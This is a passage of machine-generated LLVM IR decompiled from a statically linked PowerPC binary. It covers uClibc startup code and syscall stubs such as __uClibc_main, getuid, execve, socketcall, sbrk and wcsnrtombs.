  %v2_1001101c = load i32, i32* @r4, align 4
  %v3_1001101c = call i32 @unknown_0(i32 268632064, i32 %v2_1001101c)
  store i32 %v3_1001101c, i32* @r3, align 4
  br label %dec_label_pc_10011020

dec_label_pc_10011020:                            ; preds = %dec_label_pc_10011008, %dec_label_pc_10011018
  %v3_10011024 = load i32, i32* @global_var_10028828.685, align 4
  %v3_10011028 = icmp eq i32 %v3_10011024, 0
  br i1 %v3_10011028, label %dec_label_pc_10011020.dec_label_pc_10011038_crit_edge, label %dec_label_pc_10011030

dec_label_pc_10011020.dec_label_pc_10011038_crit_edge: ; preds = %dec_label_pc_10011020
  %v0_10011048.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10011038

dec_label_pc_10011030:                            ; preds = %dec_label_pc_10011020
  %v2_10011034 = load i32, i32* @r4, align 4
  %v3_10011034 = call i32 @unknown_0(i32 268632064, i32 %v2_10011034)
  br label %dec_label_pc_10011038

dec_label_pc_10011038:                            ; preds = %dec_label_pc_10011020.dec_label_pc_10011038_crit_edge, %dec_label_pc_10011030
  %v0_10011048 = phi i32 [ %v0_10011048.pre, %dec_label_pc_10011020.dec_label_pc_10011038_crit_edge ], [ %v3_10011034, %dec_label_pc_10011030 ]
  ret i32 %v0_10011048

; uselistorder directives
  uselistorder i32 (i32, i32)* @unknown_0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10011038, { 1, 0 }
  uselistorder label %dec_label_pc_10011020, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v0_10011054 = load i32, i32* @r3, align 4
  ret i32 %v0_10011054
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r30, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268505212, i32* @lr, align 4
  %v2_10011078 = call i32 @__libc_fcntl(i32 1, i32 1)
  %v3_1001107c = icmp eq i32 %v2_10011078, -1
  br i1 %v3_1001107c, label %dec_label_pc_10011084, label %dec_label_pc_100110a4

dec_label_pc_10011084:                            ; preds = %entry
  %v0_10011088 = load i32, i32* @r30, align 4
  store i32 268505240, i32* @lr, align 4
  %v3_10011094 = call i32 @__libc_open(i32 ptrtoint ([10 x i8]* @global_var_10017df0.686 to i32), i32 %v0_10011088)
  %v1_10011098 = load i32, i32* @r31, align 4
  %v4_10011098 = icmp eq i32 %v3_10011094, %v1_10011098
  br i1 %v4_10011098, label %dec_label_pc_100110a4, label %dec_label_pc_100110a0

dec_label_pc_100110a0:                            ; preds = %dec_label_pc_10011084
  %v1_100110a0 = call i32 @abort(i32 %v3_10011094)
  br label %dec_label_pc_100110a4

dec_label_pc_100110a4:                            ; preds = %entry, %dec_label_pc_10011084, %dec_label_pc_100110a0
  %v0_100110b4 = phi i32 [ %v2_10011078, %entry ], [ %v3_10011094, %dec_label_pc_10011084 ], [ %v1_100110a0, %dec_label_pc_100110a0 ]
  ret i32 %v0_100110b4

; uselistorder directives
  uselistorder i32 (i32, i32)* @__libc_open, { 0, 3, 5, 4, 2, 1 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 0, 5, 7, 6, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_100110a4, { 2, 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v3_100110d8 = load i32, i32* @global_var_1002882c.687, align 4
  %v3_100110dc = icmp eq i32 %v3_100110d8, 0
  br i1 %v3_100110dc, label %dec_label_pc_10011100, label %entry.dec_label_pc_10011124_crit_edge

entry.dec_label_pc_10011124_crit_edge:            ; preds = %entry
  %v0_10011134.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10011124

dec_label_pc_10011100:                            ; preds = %entry
  store i32 1, i32* @global_var_1002882c.687, align 4
  store i32 4096, i32* @global_var_10028820.604, align 4
  %v1_10011120 = call i32 @_stdio_init(i32 268489440)
  br label %dec_label_pc_10011124

dec_label_pc_10011124:                            ; preds = %entry.dec_label_pc_10011124_crit_edge, %dec_label_pc_10011100
  %v0_10011134 = phi i32 [ %v0_10011134.pre, %entry.dec_label_pc_10011124_crit_edge ], [ %v1_10011120, %dec_label_pc_10011100 ]
  ret i32 %v0_10011134

; uselistorder directives
  uselistorder label %dec_label_pc_10011124, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  store i32 %tmp, i32* @r30, align 4
  %v1_10011150 = mul i32 %arg2, 4
  %v2_10011154 = add i32 %tmp, %v1_10011150
  %v0_10011158 = load i32, i32* @r9, align 4
  store i32 %v0_10011158, i32* @global_var_10028818.688, align 4
  %v1_1001115c = add i32 %v2_10011154, 4
  store i32 268632064, i32* %r29.global-to-local, align 4
  store i32 %v1_1001115c, i32* @global_var_1002881c.682, align 4
  store i32 %arg6, i32* @global_var_10028828.685, align 4
  store i32 %arg2, i32* @r26, align 4
  store i32 %arg1, i32* @r25, align 4
  store i32 %arg4, i32* @r28, align 4
  %v2_1001117c = load i32, i32* %arg3, align 4
  store i32 %arg5, i32* @r27, align 4
  %v4_10011184 = icmp eq i32 %v1_1001115c, %v2_1001117c
  br i1 %v4_10011184, label %dec_label_pc_1001118c, label %dec_label_pc_10011190

dec_label_pc_1001118c:                            ; preds = %entry
  store i32 %v2_10011154, i32* @global_var_1002881c.682, align 4
  br label %dec_label_pc_10011190

dec_label_pc_10011190:                            ; preds = %entry, %dec_label_pc_1001118c
  %v2_10011190 = ptrtoint i32* %stack_var_-168 to i32
  store i32 268505504, i32* @lr, align 4
  %v3_1001119c = call i32 @__GI_memset(i32 %v2_10011190, i32 0, i32 120)
  %storemerge.pre = load i32, i32* @global_var_1002881c.682, align 4
  br label %dec_label_pc_100111ac

dec_label_pc_100111ac:                            ; preds = %dec_label_pc_100111ac, %dec_label_pc_10011190
  %storemerge = phi i32 [ %storemerge.pre, %dec_label_pc_10011190 ], [ %v1_100111b0, %dec_label_pc_100111ac ]
  %v1_100111ac = inttoptr i32 %storemerge to i32*
  %v2_100111ac = load i32, i32* %v1_100111ac, align 4
  %v1_100111b0 = add i32 %storemerge, 4
  %v3_100111b4 = icmp eq i32 %v2_100111ac, 0
  br i1 %v3_100111b4, label %dec_label_pc_100111bc, label %dec_label_pc_100111ac

dec_label_pc_100111bc:                            ; preds = %dec_label_pc_100111ac
  store i32 %v1_100111b0, i32* %r29.global-to-local, align 4
  %v1_100111e812 = inttoptr i32 %v1_100111b0 to i32*
  %v2_100111e813 = load i32, i32* %v1_100111e812, align 4
  %v3_100111ec16 = icmp eq i32 %v2_100111e813, 0
  br i1 %v3_100111ec16, label %dec_label_pc_100111f4, label %dec_label_pc_100111c4

dec_label_pc_100111c4:                            ; preds = %dec_label_pc_100111bc, %dec_label_pc_100111e4
  %v0_100111d8 = phi i32 [ %v1_100111e4, %dec_label_pc_100111e4 ], [ %v1_100111b0, %dec_label_pc_100111bc ]
  %v0_100111cc = phi i32 [ %v2_100111e8, %dec_label_pc_100111e4 ], [ %v2_100111e813, %dec_label_pc_100111bc ]
  %v2_100111c4 = icmp ugt i32 %v0_100111cc, 14
  br i1 %v2_100111c4, label %dec_label_pc_100111e4, label %dec_label_pc_100111cc

dec_label_pc_100111cc:                            ; preds = %dec_label_pc_100111c4
  %v1_100111cc = mul i32 %v0_100111cc, 8
  %v2_100111d4 = add i32 %v1_100111cc, %v2_10011190
  store i32 %v2_100111d4, i32* @r3, align 4
  store i32 %v0_100111d8, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268505572, i32* @lr, align 4
  %v0_100111e0 = call i32 @memcpy()
  %v0_100111e4.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100111e4

dec_label_pc_100111e4:                            ; preds = %dec_label_pc_100111c4, %dec_label_pc_100111cc
  %v0_100111e4 = phi i32 [ %v0_100111d8, %dec_label_pc_100111c4 ], [ %v0_100111e4.pre, %dec_label_pc_100111cc ]
  %v1_100111e4 = add i32 %v0_100111e4, 8
  store i32 %v1_100111e4, i32* %r29.global-to-local, align 4
  %v1_100111e8 = inttoptr i32 %v1_100111e4 to i32*
  %v2_100111e8 = load i32, i32* %v1_100111e8, align 4
  %v3_100111ec = icmp eq i32 %v2_100111e8, 0
  br i1 %v3_100111ec, label %dec_label_pc_100111f4, label %dec_label_pc_100111c4

dec_label_pc_100111f4:                            ; preds = %dec_label_pc_100111e4, %dec_label_pc_100111bc
  %v1_100111f8 = call i32 @_dl_aux_init(i32 %v2_10011190)
  store i32 %v1_100111f8, i32* @r3, align 4
  store i32 268505600, i32* @lr, align 4
  %v1_100111fc = call i32 @__GI___uClibc_init(i32 %v1_100111f8)
  %v3_10011204 = icmp eq i32 %tmp27, 0
  br i1 %v3_10011204, label %dec_label_pc_1001120c, label %dec_label_pc_10011210

dec_label_pc_1001120c:                            ; preds = %dec_label_pc_100111f4
  br label %dec_label_pc_10011210

dec_label_pc_10011210:                            ; preds = %dec_label_pc_100111f4, %dec_label_pc_1001120c
  %v0_10011218 = phi i32 [ %tmp27, %dec_label_pc_100111f4 ], [ 4096, %dec_label_pc_1001120c ]
  store i32 %v0_10011218, i32* @global_var_10028820.604, align 4
  %v3_1001121c = icmp eq i32 %tmp26, -1
  br i1 %v3_1001121c, label %dec_label_pc_10011224, label %dec_label_pc_10011258

dec_label_pc_10011224:                            ; preds = %dec_label_pc_10011210
  store i32 268505640, i32* @lr, align 4
  %v1_10011224 = call i32 @getuid(i32 268632064)
  store i32 %v1_10011224, i32* %r29.global-to-local, align 4
  store i32 268505648, i32* @lr, align 4
  %v0_1001122c = call i32 @geteuid()
  %v4_10011230 = icmp eq i32 %v1_10011224, %v0_1001122c
  br i1 %v4_10011230, label %dec_label_pc_10011238, label %dec_label_pc_10011274

dec_label_pc_10011238:                            ; preds = %dec_label_pc_10011224
  store i32 268505660, i32* @lr, align 4
  %v1_10011238 = call i32 @getgid(i32 %v0_1001122c)
  store i32 %v1_10011238, i32* %r29.global-to-local, align 4
  store i32 268505668, i32* @lr, align 4
  %v0_10011240 = call i32 @getegid()
  %v4_10011244 = icmp eq i32 %v1_10011238, %v0_10011240
  br i1 %v4_10011244, label %dec_label_pc_1001124c.thread, label %dec_label_pc_10011274

dec_label_pc_1001124c.thread:                     ; preds = %dec_label_pc_10011238
  br label %dec_label_pc_100112a4

dec_label_pc_10011258:                            ; preds = %dec_label_pc_10011210
  %v4_1001125c = icmp eq i32 %tmp26, %tmp25
  br i1 %v4_1001125c, label %dec_label_pc_10011264, label %dec_label_pc_10011274

dec_label_pc_10011264:                            ; preds = %dec_label_pc_10011258
  br label %dec_label_pc_10011274

dec_label_pc_10011274:                            ; preds = %dec_label_pc_10011264, %dec_label_pc_10011258, %dec_label_pc_10011238, %dec_label_pc_10011224
  store i32 268505732, i32* @lr, align 4
  %v2_10011280 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 268505748, i32* @lr, align 4
  %v2_10011290 = call i32 @__check_one_fd(i32 1, i32 32770)
  store i32 268505764, i32* @lr, align 4
  %v2_100112a0 = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_100112a4

dec_label_pc_100112a4:                            ; preds = %dec_label_pc_1001124c.thread, %dec_label_pc_10011274
  %v0_100112b0 = load i32, i32* @r30, align 4
  %v1_100112b0 = inttoptr i32 %v0_100112b0 to i32*
  %v2_100112b0 = load i32, i32* %v1_100112b0, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v2_100112b0, i32* inttoptr (i32 268601284 to i32*), align 4
  %v0_100112d0 = load i32, i32* @r27, align 4
  store i32 %v0_100112d0, i32* @global_var_10028824.684, align 4
  br i1 false, label %dec_label_pc_100112d8, label %dec_label_pc_10011350

dec_label_pc_100112d8:                            ; preds = %dec_label_pc_100112a4, %dec_label_pc_100112d8
  br i1 undef, label %dec_label_pc_100112d8, label %dec_label_pc_10011350

dec_label_pc_10011350:                            ; preds = %dec_label_pc_100112d8, %dec_label_pc_100112a4
  %v0_100112fc = load i32, i32* @r28, align 4
  call void @__pseudo_call(i32 %v0_100112fc)
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_10011360 = call i32 @__errno_location()
  %v2_10011368 = inttoptr i32 %v0_10011360 to i32*
  store i32 0, i32* %v2_10011368, align 4
  %v0_1001137c = call i32 @__GI___h_errno_location()
  %v2_10011384 = inttoptr i32 %v0_1001137c to i32*
  store i32 0, i32* %v2_10011384, align 4
  %v0_10011394 = load i32, i32* @r25, align 4
  call void @__pseudo_call(i32 %v0_10011394)
  %v0_100113a0 = call i32 @__GI_exit()
  ret i32 %v0_100113a0

; uselistorder directives
  uselistorder i32 %v2_100111e8, { 1, 0 }
  uselistorder i32 %v1_100111e4, { 2, 1, 0 }
  uselistorder i32 %v1_100111b0, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v2_10011190, { 1, 0, 2 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7 }
  uselistorder i32 ()* @__GI_exit, { 0, 7, 3, 1, 2, 6, 5, 4 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 4096, { 1, 3, 14, 15, 2, 13, 4, 5, 6, 7, 8, 9, 10, 11, 0, 12 }
  uselistorder i32 14, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_100112d8, { 1, 0 }
  uselistorder label %dec_label_pc_100112a4, { 1, 0 }
  uselistorder label %dec_label_pc_10011210, { 1, 0 }
  uselistorder label %dec_label_pc_100111e4, { 1, 0 }
  uselistorder label %dec_label_pc_100111c4, { 1, 0 }
  uselistorder label %dec_label_pc_10011190, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_100113b0 = load i32, i32* @r3, align 4
  store i32 %v0_100113b0, i32* @r29, align 4
  %v0_100113b8 = call i32 @__errno_location()
  %v0_100113bc = load i32, i32* @r29, align 4
  %v2_100113bc = inttoptr i32 %v0_100113b8 to i32*
  store i32 %v0_100113bc, i32* %v2_100113bc, align 4
  ret i32 -1
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100113f0 = call i32 @__asm_mfcr()
  %v1_100113f4 = and i32 %v0_100113f0, 268435456
  %v3_100113f4 = icmp eq i32 %v1_100113f4, 0
  store i32 %v0_100113f0, i32* %r31.global-to-local, align 4
  br i1 %v3_100113f4, label %dec_label_pc_1001140c, label %dec_label_pc_10011400

dec_label_pc_10011400:                            ; preds = %entry
  %v0_10011400 = call i32 @__errno_location()
  %v0_10011404 = load i32, i32* %r31.global-to-local, align 4
  %v2_10011404 = inttoptr i32 %v0_10011400 to i32*
  store i32 %v0_10011404, i32* %v2_10011404, align 4
  br label %dec_label_pc_1001140c

dec_label_pc_1001140c:                            ; preds = %entry, %dec_label_pc_10011400
  %v0_1001141c = phi i32 [ %v0_100113f0, %entry ], [ -1, %dec_label_pc_10011400 ]
  ret i32 %v0_1001141c

; uselistorder directives
  uselistorder label %dec_label_pc_1001140c, { 1, 0 }
}

define i32 @__GI_execve(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10011438 = call i32 @__asm_mfcr()
  %v1_1001143c = and i32 %v0_10011438, 268435456
  %v3_1001143c = icmp eq i32 %v1_1001143c, 0
  store i32 %v0_10011438, i32* %r31.global-to-local, align 4
  br i1 %v3_1001143c, label %dec_label_pc_10011454, label %dec_label_pc_10011448

dec_label_pc_10011448:                            ; preds = %entry
  %v0_10011448 = call i32 @__errno_location()
  %v0_1001144c = load i32, i32* %r31.global-to-local, align 4
  %v2_1001144c = inttoptr i32 %v0_10011448 to i32*
  store i32 %v0_1001144c, i32* %v2_1001144c, align 4
  br label %dec_label_pc_10011454

dec_label_pc_10011454:                            ; preds = %entry, %dec_label_pc_10011448
  %v0_10011464 = phi i32 [ %v0_10011438, %entry ], [ -1, %dec_label_pc_10011448 ]
  ret i32 %v0_10011464

; uselistorder directives
  uselistorder label %dec_label_pc_10011454, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10011480 = call i32 @__asm_mfcr()
  %v1_10011484 = and i32 %v0_10011480, 268435456
  %v3_10011484 = icmp eq i32 %v1_10011484, 0
  store i32 %v0_10011480, i32* %r31.global-to-local, align 4
  br i1 %v3_10011484, label %dec_label_pc_1001149c, label %dec_label_pc_10011490

dec_label_pc_10011490:                            ; preds = %entry
  %v0_10011490 = call i32 @__errno_location()
  %v0_10011494 = load i32, i32* %r31.global-to-local, align 4
  %v2_10011494 = inttoptr i32 %v0_10011490 to i32*
  store i32 %v0_10011494, i32* %v2_10011494, align 4
  br label %dec_label_pc_1001149c

dec_label_pc_1001149c:                            ; preds = %entry, %dec_label_pc_10011490
  %v0_100114ac = phi i32 [ %v0_10011480, %entry ], [ -1, %dec_label_pc_10011490 ]
  ret i32 %v0_100114ac

; uselistorder directives
  uselistorder label %dec_label_pc_1001149c, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100114c8 = call i32 @__asm_mfcr()
  %v1_100114cc = and i32 %v0_100114c8, 268435456
  %v3_100114cc = icmp eq i32 %v1_100114cc, 0
  store i32 %v0_100114c8, i32* %r31.global-to-local, align 4
  br i1 %v3_100114cc, label %dec_label_pc_100114e4, label %dec_label_pc_100114d8

dec_label_pc_100114d8:                            ; preds = %entry
  %v0_100114d8 = call i32 @__errno_location()
  %v0_100114dc = load i32, i32* %r31.global-to-local, align 4
  %v2_100114dc = inttoptr i32 %v0_100114d8 to i32*
  store i32 %v0_100114dc, i32* %v2_100114dc, align 4
  br label %dec_label_pc_100114e4

dec_label_pc_100114e4:                            ; preds = %entry, %dec_label_pc_100114d8
  %v0_100114f4 = phi i32 [ %v0_100114c8, %entry ], [ -1, %dec_label_pc_100114d8 ]
  ret i32 %v0_100114f4

; uselistorder directives
  uselistorder label %dec_label_pc_100114e4, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10011510 = call i32 @__asm_mfcr()
  %v1_10011514 = and i32 %v0_10011510, 268435456
  %v3_10011514 = icmp eq i32 %v1_10011514, 0
  store i32 %v0_10011510, i32* %r31.global-to-local, align 4
  br i1 %v3_10011514, label %dec_label_pc_1001152c, label %dec_label_pc_10011520

dec_label_pc_10011520:                            ; preds = %entry
  %v0_10011520 = call i32 @__errno_location()
  %v0_10011524 = load i32, i32* %r31.global-to-local, align 4
  %v2_10011524 = inttoptr i32 %v0_10011520 to i32*
  store i32 %v0_10011524, i32* %v2_10011524, align 4
  br label %dec_label_pc_1001152c

dec_label_pc_1001152c:                            ; preds = %entry, %dec_label_pc_10011520
  %v0_1001153c = phi i32 [ %v0_10011510, %entry ], [ -1, %dec_label_pc_10011520 ]
  ret i32 %v0_1001153c

; uselistorder directives
  uselistorder label %dec_label_pc_1001152c, { 1, 0 }
}

define i32 @getuid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10011558 = call i32 @__asm_mfcr()
  %v1_1001155c = and i32 %v0_10011558, 268435456
  %v3_1001155c = icmp eq i32 %v1_1001155c, 0
  store i32 %v0_10011558, i32* %r31.global-to-local, align 4
  br i1 %v3_1001155c, label %dec_label_pc_10011574, label %dec_label_pc_10011568

dec_label_pc_10011568:                            ; preds = %entry
  %v0_10011568 = call i32 @__errno_location()
  %v0_1001156c = load i32, i32* %r31.global-to-local, align 4
  %v2_1001156c = inttoptr i32 %v0_10011568 to i32*
  store i32 %v0_1001156c, i32* %v2_1001156c, align 4
  br label %dec_label_pc_10011574

dec_label_pc_10011574:                            ; preds = %entry, %dec_label_pc_10011568
  %v0_10011584 = phi i32 [ %v0_10011558, %entry ], [ -1, %dec_label_pc_10011568 ]
  ret i32 %v0_10011584

; uselistorder directives
  uselistorder label %dec_label_pc_10011574, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100115a0 = call i32 @__asm_mfcr()
  %v1_100115a4 = and i32 %v0_100115a0, 268435456
  %v3_100115a4 = icmp eq i32 %v1_100115a4, 0
  store i32 %v0_100115a0, i32* %r31.global-to-local, align 4
  br i1 %v3_100115a4, label %dec_label_pc_100115bc, label %dec_label_pc_100115b0

dec_label_pc_100115b0:                            ; preds = %entry
  %v0_100115b0 = call i32 @__errno_location()
  %v0_100115b4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100115b4 = inttoptr i32 %v0_100115b0 to i32*
  store i32 %v0_100115b4, i32* %v2_100115b4, align 4
  br label %dec_label_pc_100115bc

dec_label_pc_100115bc:                            ; preds = %entry, %dec_label_pc_100115b0
  %v0_100115cc = phi i32 [ %v0_100115a0, %entry ], [ -1, %dec_label_pc_100115b0 ]
  ret i32 %v0_100115cc

; uselistorder directives
  uselistorder label %dec_label_pc_100115bc, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r30, align 4
  %v3_100115ec = load i32, i32* @global_var_10028850.691, align 4
  %v3_100115f0 = icmp eq i32 %v3_100115ec, 0
  br i1 %v3_100115f0, label %dec_label_pc_100115f8, label %dec_label_pc_10011604

dec_label_pc_100115f8:                            ; preds = %entry
  store i32 268506620, i32* @lr, align 4
  %v1_100115f8 = call i32 @__GI_brk(i32 0)
  %v1_100115fc = icmp slt i32 %v1_100115f8, 0
  br i1 %v1_100115fc, label %dec_label_pc_10011624, label %dec_label_pc_100115f8.dec_label_pc_10011604_crit_edge

dec_label_pc_100115f8.dec_label_pc_10011604_crit_edge: ; preds = %dec_label_pc_100115f8
  %v0_10011604.pre = load i32, i32* @r30, align 4
  %v3_10011608.pre = load i32, i32* @global_var_10028850.691, align 4
  br label %dec_label_pc_10011604

dec_label_pc_10011604:                            ; preds = %dec_label_pc_100115f8.dec_label_pc_10011604_crit_edge, %entry
  %v3_10011608 = phi i32 [ %v3_10011608.pre, %dec_label_pc_100115f8.dec_label_pc_10011604_crit_edge ], [ %v3_100115ec, %entry ]
  %v1_10011610 = phi i32 [ %v0_10011604.pre, %dec_label_pc_100115f8.dec_label_pc_10011604_crit_edge ], [ %arg1, %entry ]
  %v3_10011604 = icmp eq i32 %v1_10011610, 0
  store i32 %v3_10011608, i32* @r31, align 4
  br i1 %v3_10011604, label %dec_label_pc_10011628, label %dec_label_pc_10011618

dec_label_pc_10011618:                            ; preds = %dec_label_pc_10011604
  %v2_10011610 = add i32 %v1_10011610, %v3_10011608
  store i32 268506652, i32* @lr, align 4
  %v1_10011618 = call i32 @__GI_brk(i32 %v2_10011610)
  %tmp6 = icmp sgt i32 %v1_10011618, -1
  br i1 %tmp6, label %dec_label_pc_10011618.dec_label_pc_10011628_crit_edge, label %dec_label_pc_10011624

dec_label_pc_10011618.dec_label_pc_10011628_crit_edge: ; preds = %dec_label_pc_10011618
  %v0_1001162c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10011628

dec_label_pc_10011624:                            ; preds = %dec_label_pc_10011618, %dec_label_pc_100115f8
  store i32 -1, i32* @r31, align 4
  br label %dec_label_pc_10011628

dec_label_pc_10011628:                            ; preds = %dec_label_pc_10011618.dec_label_pc_10011628_crit_edge, %dec_label_pc_10011604, %dec_label_pc_10011624
  %v0_1001162c = phi i32 [ %v0_1001162c.pre, %dec_label_pc_10011618.dec_label_pc_10011628_crit_edge ], [ %v3_10011608, %dec_label_pc_10011604 ], [ -1, %dec_label_pc_10011624 ]
  ret i32 %v0_1001162c

; uselistorder directives
  uselistorder i32 %v3_10011608, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_10011628, { 2, 0, 1 }
}

define i32 @wait4(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10011658 = call i32 @__asm_mfcr()
  %v1_1001165c = and i32 %v0_10011658, 268435456
  %v3_1001165c = icmp eq i32 %v1_1001165c, 0
  store i32 %v0_10011658, i32* %r31.global-to-local, align 4
  br i1 %v3_1001165c, label %dec_label_pc_10011674, label %dec_label_pc_10011668

dec_label_pc_10011668:                            ; preds = %entry
  %v0_10011668 = call i32 @__errno_location()
  %v0_1001166c = load i32, i32* %r31.global-to-local, align 4
  %v2_1001166c = inttoptr i32 %v0_10011668 to i32*
  store i32 %v0_1001166c, i32* %v2_1001166c, align 4
  br label %dec_label_pc_10011674

dec_label_pc_10011674:                            ; preds = %entry, %dec_label_pc_10011668
  %v0_10011684 = phi i32 [ %v0_10011658, %entry ], [ -1, %dec_label_pc_10011668 ]
  ret i32 %v0_10011684

; uselistorder directives
  uselistorder label %dec_label_pc_10011674, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_10028834.692 to i32)
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10011694 = icmp eq i32 %arg1, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 16, i32* @r6, align 4
  %v2_100116b0 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_100116b0, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  br i1 %v3_10011694, label %dec_label_pc_100116bc, label %dec_label_pc_100116c4

dec_label_pc_100116bc:                            ; preds = %entry
  %v2_100116bc = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_100116bc, i32* @r3, align 4
  br label %dec_label_pc_100116c4

dec_label_pc_100116c4:                            ; preds = %entry, %dec_label_pc_100116bc
  %v0_100116c8 = phi i32 [ %arg2, %entry ], [ 0, %dec_label_pc_100116bc ]
  %v2_100116c4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v0_100116c8, i32* %stack_var_-40, align 4
  store i32 %v2_100116c4, i32* %stack_var_-36, align 4
  store i32 268506836, i32* @lr, align 4
  %v0_100116d0 = call i32 @__GI_wcsnrtombs()
  %v3_100116d4 = icmp eq i32 %v0_100116d0, 0
  br i1 %v3_100116d4, label %dec_label_pc_100116dc, label %dec_label_pc_100116e0

dec_label_pc_100116dc:                            ; preds = %dec_label_pc_100116c4
  br label %dec_label_pc_100116e0

dec_label_pc_100116e0:                            ; preds = %dec_label_pc_100116c4, %dec_label_pc_100116dc
  %v0_100116ec = phi i32 [ %v0_100116d0, %dec_label_pc_100116c4 ], [ 1, %dec_label_pc_100116dc ]
  ret i32 %v0_100116ec

; uselistorder directives
  uselistorder label %dec_label_pc_100116e0, { 1, 0 }
  uselistorder label %dec_label_pc_100116c4, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_100116f0 = load i32, i32* @r6, align 4
  store i32 %v0_100116f0, i32* @r7, align 4
  %v0_100116f4 = load i32, i32* @r5, align 4
  store i32 %v0_100116f4, i32* @r6, align 4
  store i32 -1, i32* @r5, align 4
  %v0_100116fc = call i32 @__GI_wcsnrtombs()
  ret i32 %v0_100116fc

; uselistorder directives
  uselistorder i32 ()* @__GI_wcsnrtombs, { 1, 0 }
}

define i32 @__GI_wcsnrtombs() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10011700 = load i32, i32* @r3, align 4
  %v3_10011700 = icmp eq i32 %v0_10011700, 0
  %v0_10011704 = load i32, i32* @lr, align 4
  store i32 %v0_10011704, i32* %r0.global-to-local, align 4
  br i1 %v3_10011700, label %dec_label_pc_1001172c, label %dec_label_pc_10011714

dec_label_pc_10011714:                            ; preds = %entry
  %v1_10011714 = load i32, i32* @r4, align 4
  %v4_10011714 = icmp eq i32 %v0_10011700, %v1_10011714
  store i32 1, i32* %r10.global-to-local, align 4
  br i1 %v4_10011714, label %dec_label_pc_10011720, label %dec_label_pc_10011758

dec_label_pc_10011720:                            ; preds = %dec_label_pc_10011714
  %v2_10011724 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10011724, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10011758

dec_label_pc_1001172c:                            ; preds = %entry
  %v2_1001172411 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1001172411, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_10011758

dec_label_pc_10011738:                            ; preds = %dec_label_pc_10011798.dec_label_pc_10011778_crit_edge, %dec_label_pc_10011778.preheader
  %v0_10011738 = call i32 @__errno_location()
